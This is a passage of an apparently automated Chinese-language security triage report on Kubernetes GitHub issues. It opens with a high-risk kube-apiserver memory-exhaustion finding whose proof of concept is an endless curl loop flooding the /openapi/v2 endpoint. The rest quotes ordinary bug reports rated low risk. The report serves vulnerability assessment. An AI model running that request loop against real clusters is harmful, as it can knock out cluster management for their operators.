- **权限要求（PR）**：无（N）— 攻击者不需要任何权限。
- **用户交互（UI）**：无（N）— 不需要其他用户参与。
- **作用域（S）**：未改变（U）— 仅影响`kube-apiserver`自身。
- **可用性影响（A）**：高（H）— 服务器可能崩溃或无法提供服务。

综合评分为**7.5（高）**。

**可能的影响：**

- **服务中断**：`kube-apiserver`内存耗尽，无法处理合法请求，影响集群管理和业务运行。
- **资源耗尽**：可能影响同服务器上运行的其他服务，导致整体系统不稳定。

**Proof of Concept：**

攻击者可使用以下步骤测试漏洞：

1. 编写脚本或使用工具（如`curl`）持续发送请求：
   ```
   while true; do
     curl -k https://<kube-apiserver-endpoint>/openapi/v2 > /dev/null
   done
   ```
2. 监控`kube-apiserver`的内存使用情况：
   ```
   ps -o pid,rss,command -p $(pidof kube-apiserver)
   ```
3. 观察到内存占用随着请求次数不断增加，最终可能导致内存耗尽。

**建议措施：**

- **限制访问**：对`/openapi/v2`接口增加身份认证或访问控制。
- **优化缓存**：改进OpenAPI缓存机制，防止内存无限增长。
- **增加资源监控**：设置内存使用警报，及时发现异常。

---

# 🚨 存在低风险的 Issues (21 个)

## Issue #126468 kube-proxy: initialization check race leads to stale UDP conntrack

- Issue 链接：[#126468](https://github.com/kubernetes/kubernetes/issues/126468)

### Issue 内容

#### What happened?

AKS had a customer report repeated issues in their clusters where:
1. kube-proxy would redeploy (e.g. due to AKS deploying a new kube-proxy image with CVE fixes)
2. Envoy c-ares DNS client would send repeated DNS queries to the kube-dns service VIP from the same src IP address, creating a UDP conntrack entry to the svc VIP and keeping it alive. For example, with kube-dns svc VIP 192.168.0.10, conntrack showed:
```
# conntrack -L | grep 192.168.0.10 | grep UNREPLIED
udp      17 29 src=10.120.1.150 dst=192.168.0.10 sport=49660 dport=53 [UNREPLIED] src=192.168.0.10 dst=10.120.1.150 sport=53 dport=49660 mark=0 use=1
conntrack v1.4.5 (conntrack-tools): 2273 flow entries have been shown
```

3. DNS queries to the svc VIP were blackholed until the customer manually ran a command like: `conntrack -D -p udp --src 10.120.1.150 --sport 49660`

Issue occurred only in clusters with many services and endpoints (~10k services and ~6k endpoints). However, the customer has seen this issue repeatedly for months, about 1-5 times per week across their clusters.

#### What did you expect to happen?

kube-proxy code to delete stale UDP conntrack entries should have deleted the conntrack entry to kube-dns svc VIP automatically in the first sync after service and endpointslice cache is initialized.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately, the customer said they were unable to reproduce this issue in other environments outside of their production clusters. AKS engineers were also unable to repro this issue.

**Update (2024-08-03)**: I'm now able to reproduce the issue using a DNS client that reuses the same src IP / port and clears DNAT conntrack entries between queries, in a k8s 1.29.7 cluster with 2,000 services. The bug is triggered reliably in this setup with `kubectl rollout restart -n kube-system ds/kube-proxy` The test client code, scripts, and steps to reproduce are in this repository: https://github.com/wedaly/dns-blackhole-tester

#### Anything else we need to know?


The customer shared kube-proxy logs (at verbosity "3") from when the issue occurred. Unfortunately, I don't have permission to share the full logs publicly, but I think what I'm seeing in the logs gives a clue about what's happening.

1. By 05:00:02.477433 nodes, endpointslices, and services all synced:
```
I0723 05:00:02.000779       1 config.go:322] "Calling handler.OnNodeSynced()"
I0723 05:00:02.177877       1 config.go:104] "Calling handler.OnEndpointSlicesSynced()"
I0723 05:00:02.477433       1 config.go:195] "Calling handler.OnServiceSynced()"
```

2. kube-dns endpointslices processed after `OnEndpointSlicesSynced()`, but before iptables sync:
```
I0723 05:00:02.760960       1 endpointslicecache.go:358] "Setting endpoints for service port name" portName="kube-system/kube-dns:dns
```

3. First iptables sync at 05:00:02.81104 shows **4658** services, which is much less than the number of services in the cluster. (We can't see if kube-dns is one of these services, since kube-proxy at `-v=3` doesn't log which services were processed.)
```
I0723 05:00:02.811044       1 proxier.go:790] "Syncing iptables rules"
I0723 05:00:04.611400       1 proxier.go:1497] "Reloading service iptables data" numServices=4658 numEndpoints=3188 numFilterChains=6 numFilterRules=2919 numNATChains=9867 numNATRules=18214
I0723 05:00:05.721503       1 proxier.go:784] "SyncProxyRules complete" elapsed="3.244002731s"
```

4. Between `OnServiceSynced()` at 05:00:02.47743 and the next sync at 05:00:05.799348, we see thousands of lines that look like services and endpointslices updates:
```
I0723 05:00:02.492956       1 endpointslicecache.go:358] "Setting endpoints for service port name"
...
I0723 05:00:02.810688       1 utils.go:133] "Skipping service due to cluster IP"
```

5. Second sync at 05:00:05.799348 shows **9605** services:
```
I0723 05:00:05.799348       1 proxier.go:1497] "Reloading service iptables data" numServices=9605 numEndpoints=6244 numFilterChains=6 numFilterRules=5978 numNATChains=4978 numNATRules=14818
```

I believe this could explain why kube-proxy does not clean up the stale UDP conntrack entry:

* kube-proxy detects that the endpointslice and service caches are synced using [`endpointSliceInformer.Informer().HasSynced`](https://github.com/kubernetes/kubernetes/blob/2c184e444f7878bf1f017ed29e59c52f41bebe2e/pkg/proxy/config/config.go#L75) and [`serviceInformer.Informer().HasSynced`](https://github.com/kubernetes/kubernetes/blob/2c184e444f7878bf1f017ed29e59c52f41bebe2e/pkg/proxy/config/config.go#L166C17-L166C53) respectively.
* Comments on the [`HasSynced` method in the `SharedInformer` interface](https://github.com/kubernetes/kubernetes/blob/b5b21717cac7c02f2f754feb3e07b24a9d85a2fc/staging/src/k8s.io/client-go/tools/cache/shared_informer.go#L174-L181) say that this indicates that the informer cache is up-to-date, but warns "Note that this doesn't tell you if an individual handler is synced!! For that, please call HasSynced on the handle returned by AddEventHandler."
* This comment, along with the output of kube-proxy logs, makes me suspect that kube-proxy is initiating a sync *before* it has received and processed all the services and endpoints in the informer cache.
* If so, this could explain why the "delete conntrack" codepath is skipped.
   - kube-proxy deletes stale conntrack entries for UDP services that are updated from [0 endpoints to at least one endpoint](https://github.com/kubernetes/kubernetes/blob/b5b21717cac7c02f2f754feb3e07b24a9d85a2fc/pkg/proxy/endpointschangetracker.go#L323-L350) *and* are in [`svcPortMap`](https://github.com/kubernetes/kubernetes/blob/b5b21717cac7c02f2f754feb3e07b24a9d85a2fc/pkg/proxy/conntrack/cleanup.go#L87).
   - If in the first sync `svcPortMap` is missing kube-dns, but `DeletedUDPEndpoints` includes kube-dns, then kube-proxy would [skip deletion of the stale conntrack entry](https://github.com/kubernetes/kubernetes/blob/b5b21717cac7c02f2f754feb3e07b24a9d85a2fc/pkg/proxy/conntrack/cleanup.go#L87). Subsequent syncs would see at least one endpoint for kube-dns, so would continue to skip deletion.

If this theory is correct, then I wonder if kube-proxy could change the initialization check to ensure that all pre-sync events from the informer cache are delivered before the first iptables sync, maybe like this:

```diff
diff --git a/pkg/proxy/config/config.go b/pkg/proxy/config/config.go
index 373cd0a1c64..5097ab52715 100644
--- a/pkg/proxy/config/config.go
+++ b/pkg/proxy/config/config.go
@@ -78,11 +78,10 @@ type EndpointSliceConfig struct {
 // NewEndpointSliceConfig creates a new EndpointSliceConfig.
 func NewEndpointSliceConfig(ctx context.Context, endpointSliceInformer discoveryv1informers.EndpointSliceInformer, resyncPeriod time.Duration) *EndpointSliceConfig {
 	result := &EndpointSliceConfig{
-		listerSynced: endpointSliceInformer.Informer().HasSynced,
-		logger:       klog.FromContext(ctx),
+		logger: klog.FromContext(ctx),
 	}
 
-	_, _ = endpointSliceInformer.Informer().AddEventHandlerWithResyncPeriod(
+	handlerRegistration, _ := endpointSliceInformer.Informer().AddEventHandlerWithResyncPeriod(
 		cache.ResourceEventHandlerFuncs{
 			AddFunc:    result.handleAddEndpointSlice,
 			UpdateFunc: result.handleUpdateEndpointSlice,
@@ -91,6 +90,8 @@ func NewEndpointSliceConfig(ctx context.Context, endpointSliceInformer discovery
 		resyncPeriod,
 	)
 
+	result.listerSynced = handlerRegistration.HasSynced
+
 	return result
 }
 
@@ -171,11 +172,10 @@ type ServiceConfig struct {
 // NewServiceConfig creates a new ServiceConfig.
 func NewServiceConfig(ctx context.Context, serviceInformer v1informers.ServiceInformer, resyncPeriod time.Duration) *ServiceConfig {
 	result := &ServiceConfig{
-		listerSynced: serviceInformer.Informer().HasSynced,
-		logger:       klog.FromContext(ctx),
+		logger: klog.FromContext(ctx),
 	}
 
-	_, _ = serviceInformer.Informer().AddEventHandlerWithResyncPeriod(
+	handlerRegistration, _ := serviceInformer.Informer().AddEventHandlerWithResyncPeriod(
 		cache.ResourceEventHandlerFuncs{
 			AddFunc:    result.handleAddService,
 			UpdateFunc: result.handleUpdateService,
@@ -184,6 +184,8 @@ func NewServiceConfig(ctx context.Context, serviceInformer v1informers.ServiceIn
 		resyncPeriod,
 	)
 
+	result.listerSynced = handlerRegistration.HasSynced
+
 	return result
 }
```

**Should kube-proxy wait until all pre-sync events are *delivered* before setting `isInitialized=true`?**


#### Kubernetes version

kube-proxy version is v1.28.5
```
I0723 05:00:01.875477       1 server.go:846] "Version info" version="v1.28.5"
```

Note that the kube-proxy image that AKS built for 1.28.5 includes the backported patch to fix this race condition in iptables partial sync: https://github.com/kubernetes/kubernetes/pull/122757 

#### Cloud provider

Azure Kubernetes Service


#### OS version

Linux (I don't have the exact version but could get it if it's relevant)

#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

N/A

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

N/A

### 分析结果

低风险

---

## Issue #126453 CSP node can not add additional labels, regex is in wrong format

- Issue 链接：[#126453](https://github.com/kubernetes/kubernetes/issues/126453)

### Issue 内容

#### What happened?

For cloud provider nodes, there are some k8s label names are reserved. Like *kubernetes.io/* and *k8s.io/*
The current regex is: `(kubernetes|k8s).io/`
This will match the dot . as any single character.
This block adding a label name like: app.k8snio/name
The regex format is incorrect, we should escape the dot in regex so that it can match the dot as a string.

#### What did you expect to happen?

Can add additional label with name like: app.k8snio/name


#### How can we reproduce it (as minimally and precisely as possible)?

Configure AdditionalLabels in the instanceMeta to add additional label name with app.k8snio/name. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126440 `SyncPod` may fail to start a pod with init container if `RunContainerError` occurs and SidecarContainers is enabled

- Issue 链接：[#126440](https://github.com/kubernetes/kubernetes/issues/126440)

### Issue 内容

#### What happened?

It was consistently observed in a testing environment that a node-critical pod failed to start. `Created container setup` event was present but `Started container setup` was missing(`setup` is an init container). Also the following error was present but strangely only once: 
```
init container &Container{Name:setup,...} start failed in pod ... : RunContainerError: error reading from server: EOF
```

After some digging it seemed `m.runtimeService.StartContainer` throwing an error matched the observations above.
https://github.com/kubernetes/kubernetes/blob/7a4c962341e6ccd89db6736911e7e3bc7dd5165d/pkg/kubelet/kuberuntime/kuberuntime_container.go#L277-L286

#### What did you expect to happen?

Eventually the init container and the pod to start

#### How can we reproduce it (as minimally and precisely as possible)?

The following tests in `pkg/kubelet/kuberuntime/kuberuntime_manager_test.go` recreate the problem by `fakeRuntime.InjectError("StartContainer", errors.New("any error"))` and show how depending on `features.SidecarContainers` the behavior is different. When the feature gate is enabled the last init container gets stuck in `CONTAINER_CREATED` and never gets started. Therefore the pod get's stuck and never progresses

```go

func TestASidecarContainersTrue(t *testing.T) {
	featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.SidecarContainers, true)
	expected := []*cRecord{
		{name: "init1", attempt: 0, state: runtimeapi.ContainerState_CONTAINER_CREATED},
	}
	singleInit(t, expected)
}

func TestASidecarContainersFalse(t *testing.T) {
	featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.SidecarContainers, false)
	expected := []*cRecord{
		{name: "init1", attempt: 0, state: runtimeapi.ContainerState_CONTAINER_CREATED},
		{name: "init1", attempt: 1, state: runtimeapi.ContainerState_CONTAINER_RUNNING},
	}
	singleInit(t, expected)
}

func singleInit(t *testing.T, finalCRecord []*cRecord) {
	ctx := context.Background()
	fakeRuntime, _, m, err := createTestRuntimeManager()
	assert.NoError(t, err)

	initContainers := []v1.Container{
		{
			Name:            "init1",
			Image:           "init",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
	}
	containers := []v1.Container{
		{
			Name:            "foo1",
			Image:           "busybox",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
		{
			Name:            "foo2",
			Image:           "alpine",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
	}
	pod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			UID:       "12345678",
			Name:      "foo",
			Namespace: "new",
		},
		Spec: v1.PodSpec{
			Containers:     containers,
			InitContainers: initContainers,
		},
	}

	backOff := flowcontrol.NewBackOff(time.Second, time.Minute)

	// 0. should fail creating init container
	podStatus, err := m.GetPodStatus(ctx, pod.UID, pod.Name, pod.Namespace)
	assert.NoError(t, err)
	fakeRuntime.InjectError("StartContainer", errors.New("any error"))
	result := m.SyncPod(context.Background(), pod, podStatus, []v1.Secret{}, backOff)
	err = result.Error()
	fmt.Println(err)
	assert.Error(t, err)
	expected := []*cRecord{
		{name: initContainers[0].Name, attempt: 0, state: runtimeapi.ContainerState_CONTAINER_CREATED},
	}
	verifyContainerStatuses(t, fakeRuntime, expected, "start only the init container")

	// 2. sync multiple times and test for expected final cRecords
	for _ = range 10 {
		podStatus, err = m.GetPodStatus(ctx, pod.UID, pod.Name, pod.Namespace)
		assert.NoError(t, err)
		result = m.SyncPod(ctx, pod, podStatus, []v1.Secret{}, backOff)
		assert.NoError(t, result.Error())
		verifyContainerStatuses(t, fakeRuntime, finalCRecord, "syncing")
	}
}

func TestBSidecarContainersTrue(t *testing.T) {
	featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.SidecarContainers, true)
	expected := []*cRecord{
		{name: "init1", attempt: 0, state: runtimeapi.ContainerState_CONTAINER_EXITED},
		{name: "init2", attempt: 0, state: runtimeapi.ContainerState_CONTAINER_CREATED},
	}
	multipleInits(t, expected)
}

func TestBSidecarContainersFalse(t *testing.T) {
	featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.SidecarContainers, false)
	expected := []*cRecord{
		{name: "init1", attempt: 0, state: runtimeapi.ContainerState_CONTAINER_EXITED},
		{name: "init2", attempt: 0, state: runtimeapi.ContainerState_CONTAINER_CREATED},
		{name: "init2", attempt: 1, state: runtimeapi.ContainerState_CONTAINER_RUNNING},
	}
	multipleInits(t, expected)
}

func multipleInits(t *testing.T, finalCRecord []*cRecord) {
	ctx := context.Background()
	fakeRuntime, _, m, err := createTestRuntimeManager()
	assert.NoError(t, err)

	initContainers := []v1.Container{
		{
			Name:            "init1",
			Image:           "init",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
		{
			Name:            "init2",
			Image:           "init2",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
	}
	containers := []v1.Container{
		{
			Name:            "foo1",
			Image:           "busybox",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
		{
			Name:            "foo2",
			Image:           "alpine",
			ImagePullPolicy: v1.PullIfNotPresent,
		},
	}
	pod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			UID:       "12345678",
			Name:      "foo",
			Namespace: "new",
		},
		Spec: v1.PodSpec{
			Containers:     containers,
			InitContainers: initContainers,
		},
	}

	backOff := flowcontrol.NewBackOff(time.Second, time.Minute)

	// 1. should  create the firs init container.
	podStatus, err := m.GetPodStatus(ctx, pod.UID, pod.Name, pod.Namespace)
	assert.NoError(t, err)
	result := m.SyncPod(context.Background(), pod, podStatus, []v1.Secret{}, backOff)
	assert.NoError(t, result.Error())
	expected := []*cRecord{
		{name: initContainers[0].Name, attempt: 0, state: runtimeapi.ContainerState_CONTAINER_RUNNING},
	}
	verifyContainerStatuses(t, fakeRuntime, expected, "start the first init container")

	// 2. finish first init and fail to start the second
	// Stop init container instance 0.
	sandboxIDs, err := m.getSandboxIDByPodUID(ctx, pod.UID, nil)
	require.NoError(t, err)
	sandboxID := sandboxIDs[0]
	initID0, err := fakeRuntime.GetContainerID(sandboxID, initContainers[0].Name, 0)
	require.NoError(t, err)
	fakeRuntime.StopContainer(ctx, initID0, 0)
	// Simulate StartContainer failure
	fakeRuntime.InjectError("StartContainer", errors.New("any error"))
	// Sync again.
	podStatus, err = m.GetPodStatus(ctx, pod.UID, pod.Name, pod.Namespace)
	assert.NoError(t, err)
	result = m.SyncPod(ctx, pod, podStatus, []v1.Secret{}, backOff)
	assert.Error(t, result.Error())
	expected = []*cRecord{
		{name: initContainers[0].Name, attempt: 0, state: runtimeapi.ContainerState_CONTAINER_EXITED},
		{name: initContainers[1].Name, attempt: 0, state: runtimeapi.ContainerState_CONTAINER_CREATED},
	}
	verifyContainerStatuses(t, fakeRuntime, expected, "finish first init and fail to start the second")

	// sync multiple times and test for expected final cRecords
	for _ = range 10 {
		podStatus, err = m.GetPodStatus(ctx, pod.UID, pod.Name, pod.Namespace)
		assert.NoError(t, err)
		result = m.SyncPod(ctx, pod, podStatus, []v1.Secret{}, backOff)
		assert.NoError(t, result.Error())
		verifyContainerStatuses(t, fakeRuntime, finalCRecord, "syncing")
	}
}
```

#### Anything else we need to know?

The problem seems to stem from:
https://github.com/kubernetes/kubernetes/blob/7a4c962341e6ccd89db6736911e7e3bc7dd5165d/pkg/kubelet/kuberuntime/kuberuntime_container.go#L1015-L1018

There `kubecontainer.ContainerStateCreated` case get's skipped and the created container is expected to get started by the previous one by the following lines
https://github.com/kubernetes/kubernetes/blob/7a4c962341e6ccd89db6736911e7e3bc7dd5165d/pkg/kubelet/kuberuntime/kuberuntime_container.go#L1122
or
https://github.com/kubernetes/kubernetes/blob/7a4c962341e6ccd89db6736911e7e3bc7dd5165d/pkg/kubelet/kuberuntime/kuberuntime_container.go#L1171
But the provided tests show that this does not happen. Also if there is only one init container with `kubecontainer.ContainerStateCreated` the following logic should execute but won't
https://github.com/kubernetes/kubernetes/blob/7a4c962341e6ccd89db6736911e7e3bc7dd5165d/pkg/kubelet/kuberuntime/kuberuntime_container.go#L1215-L1219
because in this case this get's executed
https://github.com/kubernetes/kubernetes/blob/7a4c962341e6ccd89db6736911e7e3bc7dd5165d/pkg/kubelet/kuberuntime/kuberuntime_container.go#L1209-L1212

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126389 When there are multiple pods with podAntiAffinity for the hostname, two pods can be on the same node for a while

- Issue 链接：[#126389](https://github.com/kubernetes/kubernetes/issues/126389)

### Issue 内容

#### What happened?

When there are multiple pods with ```podAntiAffinity``` for the ```hostname``` while one pod is being deleted another pod can get scheduled to the same node before the first pod is fully deleted.

#### What did you expect to happen?

Second pod to be only scheduled to the same node after kubelet fully removes the first pod.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a cluster with 1 node pool and 1 node.
Create two namespaces and deploy the following deployment in those two namespaces.
```
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: sample-new-4
  name: sample-new-4
spec:
  replicas: 1
  selector:
    matchLabels:
      app: sample-new-4
  template:
    metadata:
      labels:
        app: sample-new-4
        tenant: tenant-a
    spec:
      containers:
        - name: nginx
          image: nginx
          ports:
            - containerPort: 80
              protocol: TCP
      affinity:
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            -  labelSelector:
                 matchExpressions:
                 - key: tenant
                   operator: In
                   values: ["tenant-a"]
               topologyKey: "kubernetes.io/hostname"
               namespaceSelector: {}

```
Pod from 1st namespace will get scheduled and the other pod will keep pending because of podAntiAffinity.
Delete the namespace of the scheduled pod. Then the other pod will get scheduled before kubelet fully remove the first pod.
Order of operations can be verified by checking kube-scheduler logs and api-server logs.

#### Anything else we need to know?

k8s scheduler use informers to listen pod deletion [events](https://github.com/kubernetes/kubernetes/blob/master/pkg/scheduler/eventhandlers.go#L386). 

Once it get a pod deletion event, it [removes the pod](https://github.com/kubernetes/kubernetes/blob/master/pkg/scheduler/internal/cache/cache.go#L469) from the node where it was scheduled in the scheduler cache.

That makes the opportunity for other pods to get schedule on that node.

Apparently in ```1.27+``` deletion event is emitted by informers before kubelet fully delete the pod.
This behavior was not reproducible in ```1.26```

#### Kubernetes version

<details>

1.27+

</details>


#### Cloud provider

<details>
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126388 [FG:InPlacePodVerticalScaling] Resizing pod gets stuck if limit is not configured

- Issue 链接：[#126388](https://github.com/kubernetes/kubernetes/issues/126388)

### Issue 内容

#### What happened?

Resizing CPU requests gets stuck in `InProgress` if the CPU limit is not configured:
```
$ kubectl patch pod resize-pod --patch '{"spec":{"containers":[{"name":"resize-container", "resources":{"requests":{"cpu":"300m"}}}]}}'
pod/resize-pod patched
$ sleep 300
$ kubectl get pod resize-pod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\nresize: "}{.status.resize}{"\n"}'
spec: {"requests":{"cpu":"300m","memory":"200Mi"}}
allocatedResources: {"cpu":"300m","memory":"200Mi"}
status: {"requests":{"cpu":"200m","memory":"200Mi"}}
resize: InProgress
```

The internal behavior in kubelet varies depending on other resource limits configuration.
- If the limit for another resource is also not configured, no action is computed at `computePodResizeAction()`:
  ```
  Jul 26 13:43:09 kind-control-plane kubelet[708]: I0726 13:43:09.494698     708 kuberuntime_manager.go:1051] "computePodActions got for pod" podActions="KillPod: false, CreateSandbox: false, UpdatePodResources: false, Attempt: 0, InitContainersToStart: [], ContainersToStart: [], EphemeralContainersToStart: [],ContainersToUpdate: map[], ContainersToKill: map[]" pod="default/resize-pod"
  ```
  This looks caused because `container.Resources.Limits == nil`:
  https://github.com/kubernetes/kubernetes/blob/3a8a60eba29940e26ac8db52329a91ba87305114/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L555-L557
- If the limit for another resource is configured, `doPodResizeAction()` gets failed:
  ```
  Jul 26 14:04:23 kind-control-plane kubelet[708]: E0726 14:04:23.063108     708 kuberuntime_manager.go:750] "podResources.CPUQuota or podResources.CPUShares is nil" pod="resize-pod"
  ```
  This message is logged here:
  https://github.com/kubernetes/kubernetes/blob/3a8a60eba29940e26ac8db52329a91ba87305114/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L754-L757
  This is caused because CPUQuota is not set if the CPU limit is not configured:
  https://github.com/kubernetes/kubernetes/blob/3a8a60eba29940e26ac8db52329a91ba87305114/pkg/kubelet/cm/helpers_linux.go#L179-L182

There is a similar problem in resizing memory limits. See the comment below: https://github.com/kubernetes/kubernetes/issues/126388#issuecomment-2276385213

#### What did you expect to happen?

This resizing should not get stuck in `InProgress` though I’m not sure whether this should be actuated or rejected yet.


#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable `InPlacePodVerticalScaling`.
2. Create a pod where CPU request is configured and CPU limit is not configured:
    <Details>

   pod with no resource limits:
   ```
   apiVersion: v1
   kind: Pod
   metadata:
     creationTimestamp: null
     labels:
       run: resize-pod
     name: resize-pod
   spec:
     containers:
     - image: busybox
       name: resize-container
       command:
         - sh
         - -c
         - trap "exit 0" SIGTERM; while true; do sleep 1; done
       resources:
         requests:
           cpu: 200m
           memory: 200Mi
       resizePolicy:
       - resourceName: cpu
         restartPolicy: NotRequired
       - resourceName: memory
         restartPolicy: NotRequired
     restartPolicy: Always
   ```

   pod with memory limit:
   ```
   apiVersion: v1
   kind: Pod
   metadata:
     creationTimestamp: null
     labels:
       run: resize-pod
     name: resize-pod
   spec:
     containers:
     - image: busybox
       name: resize-container
       command:
         - sh
         - -c
         - trap "exit 0" SIGTERM; while true; do sleep 1; done
       resources:
         requests:
           cpu: 200m
           memory: 200Mi
         limits:
           memory: 200Mi
       resizePolicy:
       - resourceName: cpu
         restartPolicy: NotRequired
       - resourceName: memory
         restartPolicy: NotRequired
     restartPolicy: Always
   ```

   </Details>
3. Patch the pod to update its CPU request:
   ```
   $ kubectl patch pod resize-pod --patch '{"spec":{"containers":[{"name":"resize-container", "resources":{"requests":{"cpu":"300m"}}}]}}'
   ```
4. Wait for more than two minutes in order to confirm this issue is not the [known issue](https://kubernetes.io/blog/2023/05/12/in-place-pod-resize-alpha/#known-issues).
5. See the pod resize status:
   ```
   $ kubectl get pod resize-pod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\nresize: "}{.status.resize}{"\n"}'
   spec: {"requests":{"cpu":"300m","memory":"200Mi"}}
   allocatedResources: {"cpu":"300m","memory":"200Mi"}
   status: {"requests":{"cpu":"200m","memory":"200Mi"}}
   resize: InProgress
   ```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

N/A


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126376 ephemeral-storage used over requested

- Issue 链接：[#126376](https://github.com/kubernetes/kubernetes/issues/126376)

### Issue 内容

#### What happened?

ephemeral-storage-pod.yaml

```
apiVersion: v1
kind: Pod
metadata:
  name: ephemeral-storage-pod
spec:
  containers:
  - name: my-container
    image: registry.cn-hangzhou.aliyuncs.com/hxpdocker/busybox:1.33.1
    image: registry.cn-hangzhou.aliyuncs.com/hxpdocker/busybox:1.33.1
    command:
    - sleep
    - inf
    resources:
      requests:
        ephemeral-storage: "1Gi"
      limits:
        ephemeral-storage: "2Gi"
    volumeMounts:
    - mountPath: /cache
      name: cache-volume
  volumes:
  - name: cache-volume
    emptyDir: {}

```

```
/ # dd if=/dev/zero of=/cache/file bs=1M count=2049
2049+0 records in
2049+0 records out
2148532224 bytes (2.0GB) copied, 1.525452 seconds, 1.3GB/s
/ # dd if=/dev/zero of=/cache/file2 bs=1M count=100
100+0 records in
100+0 records out
104857600 bytes (100.0MB) copied, 0.037725 seconds, 2.6GB/s
/ # du -sh /cache/
2.1G    /cache/
/ # 
```



#### What did you expect to happen?

limit 2Gi

#### How can we reproduce it (as minimally and precisely as possible)?

apply the yaml and dd

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl version
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0

</details>


#### Cloud provider

<details>
pve 8
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126341 Terminated but not GC'd Pods should not be re-admitted on kubelet restart

- Issue 链接：[#126341](https://github.com/kubernetes/kubernetes/issues/126341)

### Issue 内容

#### What happened?

Pods that already succeeded and waiting for finalizer are being readmitted, fail to be admitted and moving from Succeeded Phase to Failed (admission failed) phase.

#### What did you expect to happen?

The correct behavior would be to not try to re-admit the succeeded (or failed) Pod.

#### How can we reproduce it (as minimally and precisely as possible)?

Specific case:

- Node is exposing Devices using device plugin. Device plugin is implemented as a Pod
- Job's pod that is using the Device run to completion and waiting for Job Status finalizer
- kubelet is being restarted
- DevicePlugin pod is reconnecting to the kubelet. While it is reconnecting, kubelet don't have availability of devices
- kubelet re-admits the Pod, even though it is terminated already
- kubelet marks the pod as "failed to be admitted"

But the same can happen with the variations of GC speed and other admission handlers.

#### Anything else we need to know?

/sig node
/priority important-soon
/cc @bobbypage @smarterclayton 

There is also a wider issue: https://github.com/kubernetes/kubernetes/issues/123980, that concentrates on running pods. This issue is about terminated Pods, which is less controversial.

#### Kubernetes version

<details>

For sure on master, may be on earlier versions.

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>
N/A
</details>


#### Install tools

<details>
N/A
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
N/A
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### 分析结果

低风险

---

## Issue #126273 Adding additional guards on CRD schema

